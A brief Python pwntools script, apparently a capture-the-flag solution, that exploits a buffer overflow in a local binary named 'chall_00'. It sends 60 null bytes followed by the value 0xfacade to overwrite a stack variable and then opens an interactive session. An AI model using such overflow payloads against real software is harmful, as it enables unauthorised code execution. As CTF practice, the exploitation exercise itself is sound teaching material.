from pwn import *

def main():
	p = process("./chall_00")
	print(p.recv().decode())
	payload = (chr(int("00", 16)) * (72 - 12)).encode() + p32(0xfacade)
	p.sendline(payload)
	p.interactive()
main()
